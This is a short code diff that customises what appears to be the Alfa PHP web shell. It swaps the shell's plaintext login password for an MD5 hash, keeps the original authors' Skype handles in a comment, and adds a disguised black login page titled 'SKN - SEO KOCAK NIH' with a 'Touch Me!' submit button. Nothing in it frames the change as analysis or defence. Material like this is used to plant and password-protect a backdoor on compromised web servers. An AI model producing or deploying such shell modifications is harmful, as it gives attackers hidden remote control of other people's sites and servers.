@@ -8,7 +8,7 @@
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
-    'password' => 'kucinghoki808##@',//md5(ehsan)
+    'password' => '20e8d4e1eb50a1653b2ee17b5df1f780',//md5(ehsan)
     'safe_mode' => '0',
     'login_page' => '403',
     'show_icons' => '1',
@@ -6529,4 +6529,26 @@ exit;
 #skype : sole.sad
 #skype : ehsan.invisible
 */
+
+// Display login form if not logged in
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>SKN</title>
+    </head>
+    <body>
+        <center>
+        <body style="background-color:black;">
+            <h1 style="color:white;">SKN - SEO KOCAK NIH</h1>
+        <form method="POST" action="">
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password">
+            <input type="submit" value="Touch Me!">
+        </form>
+        </center>
+    </body>
+    </html>
+    <?php
+
 ?>
